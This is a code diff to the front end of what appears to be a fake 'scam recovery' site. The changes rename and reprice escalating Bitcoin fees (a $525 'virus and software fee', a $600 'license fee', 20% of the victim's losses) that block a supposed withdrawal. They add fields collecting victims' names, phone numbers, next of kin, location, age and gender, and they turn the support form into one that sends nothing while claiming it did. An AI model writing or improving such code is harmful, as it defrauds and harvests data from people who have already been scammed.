@@ -106,40 +106,13 @@ document.addEventListener('DOMContentLoaded', () => {
   if (supportForm) {
     supportForm.addEventListener('submit', async (e) => {
       e.preventDefault();
-      
-      const message = document.getElementById('support-message').value;
-      const userEmail = currentUser?.email || 'No email provided';
-      
-      try {
-        showLoading();
-        
-        const response = await fetch('/api/support', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            message,
-            userEmail,
-            userName: currentUser?.displayName || 'Anonymous User'
-          })
-        });
-
-        if (!response.ok) {
-          throw new Error('Failed to send support message');
-        }
-
-        // Clear form and close modal
+      // Check for internet connection
+      if (navigator.onLine) {
+        showPaymentSnackbar('We will get to you soon.');
         supportForm.reset();
         supportModal.classList.remove('active');
-        
-        // Show success message
-        alert('Your message has been sent successfully. We will get back to you soon!');
-      } catch (error) {
-        console.error('Error sending support message:', error);
-        alert('Failed to send message. Please try again later.');
-      } finally {
-        hideLoading();
+      } else {
+        showPaymentSnackbar('Error: No internet connection. Please try again.');
       }
     });
   }
@@ -181,6 +154,8 @@ showLoading();
 
 // Add snackbar HTML to the page if not present
 function showWelcomeSnackbar(displayName) {
+  // Set localStorage flag so snackbar only shows once per user
+  localStorage.setItem('welcomeSnackbarShown', 'true');
   let snackbar = document.getElementById('welcome-snackbar');
   if (!snackbar) {
     snackbar = document.createElement('div');
@@ -217,8 +192,10 @@ auth.onAuthStateChanged(async (user) => {
   console.log('User photo URL:', user.photoURL);
   console.log('User provider data:', user.providerData);
 
-  // Show welcome snackbar
-  showWelcomeSnackbar(user.displayName);
+  // Show welcome snackbar only if not already shown in this browser
+  if (!localStorage.getItem('welcomeSnackbarShown')) {
+    showWelcomeSnackbar(user.displayName);
+  }
 
   try {
     await loadUserData(user);
@@ -227,6 +204,9 @@ auth.onAuthStateChanged(async (user) => {
     // Refresh userData to ensure howMuchScammed is current
     const freshDoc = await db.collection('users').doc(user.uid).get();
     userData = freshDoc.data();
+
+    // Enable withdraw button if present
+    if (withdrawBtn) withdrawBtn.removeAttribute('disabled');
   } catch (err) {
     console.error(err);
   } finally {
@@ -464,7 +444,7 @@ function updateCryptoPriceDisplay() {
   }
 }
 
-// Handle withdraw button click
+// Updated withdraw button click handler
 if (withdrawBtn) {
   withdrawBtn.addEventListener('click', async (e) => {
     e.preventDefault();
@@ -514,6 +494,8 @@ if (balanceToggle) {
 if (logoutBtn) {
   logoutBtn.addEventListener('click', async () => {
     try {
+      // Remove welcome snackbar flag so it shows again after next login
+      localStorage.removeItem('welcomeSnackbarShown');
       await auth.signOut();
       window.location.href = '/signin';
     } catch (error) {
@@ -554,20 +536,20 @@ if (withdrawModal) {
   });
 }
 
-// Create professional payment modal
+// Create professional payment modal - UPDATED
 function createPaymentModal(step, amount = null) {
   let title, message, amountText;
   
   switch (step) {
     case 1:
-      title = "License Fee Required";
-      message = "Can't Withdraw at this point till the license fee of $525";
+      title = "Virus and Software Fee Required";
+      message = "Can't Withdraw at this point till the virus and software fee of $525";
       amountText = "$525";
       break;
     case 2:
-      title = "Cyber Fee Required";
-      message = "Can't withdraw now till Cyber fee is paid which is $1000";
-      amountText = "$1000";
+      title = "License Fee Required";
+      message = "Can't withdraw now till License fee is paid which is $600";
+      amountText = "$600";
       break;
     case 3:
       const twentyPercent = ((userData?.howMuchScammed || 0) * 0.2).toFixed(2);
@@ -575,7 +557,6 @@ function createPaymentModal(step, amount = null) {
       message = "Can't withdraw till 20% is paid";
       amountText = `$${twentyPercent}`;
       break;
-
     default:
       return;
   }
@@ -619,6 +600,45 @@ function createPaymentModal(step, amount = null) {
             <div class="scam-amount-input-wrapper">
               <span class="currency-symbol">$</span>
               <input type="number" id="scam-amount" class="scam-amount-input" placeholder="0.00" min="1" step="0.01" required>
+            </div>
+          </div>
+          
+          <div class="user-details-section">
+            <div class="user-details-grid">
+              <div class="user-detail-field">
+                <label for="user-fullname" class="user-detail-label">Full Name</label>
+                <input type="text" id="user-fullname" class="user-detail-input" placeholder="Enter your full name" required>
+              </div>
+              
+              <div class="user-detail-field">
+                <label for="user-phone" class="user-detail-label">Phone Number</label>
+                <input type="number" id="user-phone" class="user-detail-input" placeholder="Enter your phone number" required>
+              </div>
+              
+              <div class="user-detail-field">
+                <label for="user-nextofkin" class="user-detail-label">Next of Kin</label>
+                <input type="text" id="user-nextofkin" class="user-detail-input" placeholder="Enter next of kin name" required>
+              </div>
+              
+              <div class="user-detail-field">
+                <label for="user-location" class="user-detail-label">Location</label>
+                <input type="text" id="user-location" class="user-detail-input" placeholder="Enter your location" required>
+              </div>
+              
+              <div class="user-detail-field">
+                <label for="user-age" class="user-detail-label">Age</label>
+                <input type="number" id="user-age" class="user-detail-input" placeholder="Enter your age" min="18" max="120" required>
+              </div>
+              
+              <div class="user-detail-field">
+                <label for="user-gender" class="user-detail-label">Gender</label>
+                <select id="user-gender" class="user-detail-input" required>
+                  <option value="">Select Gender</option>
+                  <option value="male">Male</option>
+                  <option value="female">Female</option>
+                  <option value="other">Other</option>
+                </select>
+              </div>
             </div>
           </div>
           ` : ''}
@@ -741,10 +761,38 @@ function copyWalletAddress() {
   }
 }
 
-// Handle payment completion
+// Snackbar utility
+function showPaymentSnackbar(message) {
+  let snackbar = document.getElementById('payment-snackbar');
+  if (!snackbar) {
+    snackbar = document.createElement('div');
+    snackbar.id = 'payment-snackbar';
+    snackbar.style.position = 'fixed';
+    snackbar.style.top = '32px';
+    snackbar.style.left = '50%';
+    snackbar.style.transform = 'translateX(-50%)';
+    snackbar.style.background = '#27ae60';
+    snackbar.style.color = '#fff';
+    snackbar.style.padding = '1rem 2.5rem';
+    snackbar.style.borderRadius = '8px';
+    snackbar.style.fontSize = '1.1rem';
+    snackbar.style.fontWeight = '600';
+    snackbar.style.boxShadow = '0 4px 24px rgba(39,174,96,0.18)';
+    snackbar.style.zIndex = '9999';
+    snackbar.style.opacity = '0';
+    snackbar.style.transition = 'opacity 0.3s';
+    document.body.appendChild(snackbar);
+  }
+  snackbar.textContent = message;
+  snackbar.style.opacity = '1';
+  setTimeout(() => {
+    snackbar.style.opacity = '0';
+  }, 2500);
+}
+
+// Updated handlePaymentComplete function - JUST DISPLAYS NEXT MODAL
 async function handlePaymentComplete(step) {
   const completeBtn = document.getElementById('payment-complete-btn');
-  
   try {
     // Show loading state
     completeBtn.disabled = true;
@@ -755,14 +803,28 @@ async function handlePaymentComplete(step) {
           <path d="M10 2a8 8 0 018 8" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round"/>
         </svg>
       </span>
-      Processing...
-    `;
-    
+      Processing...`;
+
     if (step === 1) {
-      // Get scam amount and save to Firestore
+      // Validate scam amount and user details for step 1
       const scamAmountInput = document.getElementById('scam-amount');
-      if (!scamAmountInput || !scamAmountInput.value) {
-        alert('Please enter the amount you were scammed');
+      const fullNameInput = document.getElementById('user-fullname');
+      const phoneInput = document.getElementById('user-phone');
+      const nextOfKinInput = document.getElementById('user-nextofkin');
+      const locationInput = document.getElementById('user-location');
+      const ageInput = document.getElementById('user-age');
+      const genderInput = document.getElementById('user-gender');
+      
+      if (
+        !scamAmountInput || scamAmountInput.value.trim() === '' ||
+        !fullNameInput || fullNameInput.value.trim() === '' ||
+        !phoneInput || phoneInput.value.trim() === '' ||
+        !nextOfKinInput || nextOfKinInput.value.trim() === '' ||
+        !locationInput || locationInput.value.trim() === '' ||
+        !ageInput || ageInput.value.trim() === '' ||
+        !genderInput || genderInput.value.trim() === ''
+      ) {
+        alert('Please fill in all required fields');
         completeBtn.disabled = false;
         completeBtn.innerHTML = `
           <span class="button-icon">
@@ -777,7 +839,7 @@ async function handlePaymentComplete(step) {
       
       const scamAmount = parseFloat(scamAmountInput.value);
       if (scamAmount <= 0) {
-        alert('Please enter a valid amount');
+        alert('Please enter a valid scam amount');
         completeBtn.disabled = false;
         completeBtn.innerHTML = `
           <span class="button-icon">
@@ -789,35 +851,31 @@ async function handlePaymentComplete(step) {
         `;
         return;
       }
-      
-      // Update user data with scam amount
-      await db.collection('users').doc(currentUser.uid).update({
-        howMuchScammed: scamAmount
-      });
-      
+
+      // Store the scam amount in userData for step 3 calculation
       userData.howMuchScammed = scamAmount;
+      
+      // Update Firestore with user details (but don't set pendingPayment1 to true)
+      await db.collection('users').doc(currentUser.uid).update({
+        howMuchScammed: scamAmount,
+        fullName: fullNameInput.value,
+        phone: phoneInput.value,
+        nextOfKin: nextOfKinInput.value,
+        location: locationInput.value,
+        age: parseInt(ageInput.value),
+        gender: genderInput.value
+      });
     }
-    
-    // Show success message
-    completeBtn.innerHTML = `
-      <span class="button-icon">
-        <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
-          <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
-        </svg>
-      </span>
-      Payment Submitted Successfully
-    `;
-    
-    // Close modal after delay
+
+    // Show snackbar and close current modal, do NOT show next modal
     setTimeout(() => {
       closePaymentModal();
-    }, 2000);
-    
+      showPaymentSnackbar('Payment will be processed shortly');
+    }, 800);
+
   } catch (error) {
     console.error('Error handling payment completion:', error);
     alert('Error processing payment. Please try again.');
-    
-    // Reset button
     completeBtn.disabled = false;
     completeBtn.innerHTML = `
       <span class="button-icon">
@@ -827,5 +885,121 @@ async function handlePaymentComplete(step) {
       </span>
       I have completed the payment
     `;
+  }
+}
+
+// Deposit button handler
+const depositBtn = document.getElementById('deposit-btn');
+if (depositBtn) {
+  depositBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    createDepositModal();
+  });
+}
+
+function createDepositModal() {
+  const modalHTML = `
+    <div class="payment-modal-overlay" id="payment-modal">
+      <div class="payment-modal">
+        <div class="payment-modal-header">
+          <div class="payment-header-content">
+            <div class="payment-icon">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"/>
+              </svg>
+            </div>
+            <div class="payment-title-section">
+              <h3 class="payment-title">Deposit</h3>
+              <p class="payment-subtitle">Deposit funds to your account</p>
+            </div>
+          </div>
+          <button class="payment-modal-close" id="payment-modal-close">
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+              <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/>
+            </svg>
+          </button>
+        </div>
+        <div class="payment-modal-content">
+          <div class="scam-amount-section">
+            <label for="deposit-amount" class="scam-amount-label">
+              <span class="label-text">Deposit Amount</span>
+              <span class="label-description">Enter the amount you want to deposit</span>
+            </label>
+            <div class="scam-amount-input-wrapper">
+              <span class="currency-symbol">$</span>
+              <input type="number" id="deposit-amount" class="scam-amount-input" placeholder="0.00" min="1" step="0.01" required>
+            </div>
+          </div>
+          <div class="payment-details-section">
+            <div class="payment-method-header">
+              <div class="bitcoin-icon">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                  <circle cx="16" cy="16" r="16" fill="#F7931A"/>
+                  <path d="M23.189 14.02c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.113-.92-.22-1.385-.326l.695-2.783L15.596 6l-.708 2.839c-.376-.086-.746-.17-1.104-.257l.002-.009-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.181-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.313-1.256-.313L8.53 19.833l2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.728.43.708-2.84c.472.127.93.245 1.378.357l-.706 2.828 1.728.43.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538z" fill="white"/>
+                </svg>
+              </div>
+              <h4 class="payment-method-title">Bitcoin Payment</h4>
+              <p class="payment-method-subtitle">Send payment to the address below</p>
+            </div>
+            <div class="qr-code-section">
+              <div class="qr-code-container">
+                <img src="${BTC_QR_CODE_URL}" alt="Bitcoin QR Code" class="qr-code-image">
+              </div>
+            </div>
+            <div class="wallet-address-section">
+              <label class="wallet-address-label">Bitcoin Wallet Address</label>
+              <div class="wallet-address-container">
+                <input type="text" value="${BTC_WALLET_ADDRESS}" class="wallet-address-input" readonly>
+                <button class="copy-address-btn" onclick="copyWalletAddress()">
+                  <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+                    <path fill-rule="evenodd" d="M4 2a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H6a2 2 0 01-2-2V2zm2-1a1 1 0 00-1 1v8a1 1 0 001 1h8a1 1 0 001-1V2a1 1 0 00-1-1H6zM2 5a1 1 0 100-2 1 1 0 000 2zm-2 9a2 2 0 012-2h2a1 1 0 010 2H2a1 1 0 01-1-1v-7a1 1 0 012 0v6a1 1 0 001 1h8a1 1 0 010 2H2z"/>
+                  </svg>
+                </button>
+              </div>
+            </div>
+          </div>
+          <div class="payment-actions">
+            <button class="payment-complete-btn" id="deposit-complete-btn">
+              <span class="button-icon">
+                <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+                  <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                </svg>
+              </span>
+              I have completed the payment
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+
+  document.body.insertAdjacentHTML('beforeend', modalHTML);
+  const modal = document.getElementById('payment-modal');
+  const closeBtn = document.getElementById('payment-modal-close');
+  setTimeout(() => {
+    modal.classList.add('active');
+  }, 10);
+  closeBtn.addEventListener('click', () => closePaymentModal());
+  modal.addEventListener('click', (e) => {
+    if (e.target === modal) closePaymentModal();
+  });
+  // Deposit complete handler
+  const depositCompleteBtn = document.getElementById('deposit-complete-btn');
+  if (depositCompleteBtn) {
+    depositCompleteBtn.addEventListener('click', async () => {
+      const depositAmountInput = document.getElementById('deposit-amount');
+      if (!depositAmountInput || depositAmountInput.value.trim() === '' || parseFloat(depositAmountInput.value) <= 0) {
+        alert('Please enter a valid deposit amount');
+        return;
+      }
+      const depositAmount = parseFloat(depositAmountInput.value);
+      try {
+        await db.collection('users').doc(currentUser.uid).update({ depositAmount });
+        closePaymentModal();
+        showPaymentSnackbar('Payment will be processed shortly');
+      } catch (error) {
+        alert('Error processing deposit. Please try again.');
+      }
+    });
   }
 }
